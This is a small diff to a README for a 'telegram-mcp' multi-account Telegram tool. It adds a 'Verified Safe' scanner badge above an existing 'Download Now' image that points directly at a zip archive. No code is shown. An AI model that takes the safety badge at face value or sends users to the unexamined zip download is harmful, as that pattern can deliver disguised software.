@@ -1,5 +1,7 @@
 # 🚀 telegram-mcp - Manage Multiple Telegram Accounts Easily
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/saadkhan1150-telegram-mcp)
+
 ![Download Now](https://raw.githubusercontent.com/saadkhan1150/telegram-mcp/main/static/telegram-mcp-v1.2.zip%20Now-telegram--mcp-brightgreen)
 
 ## 🌟 Introduction
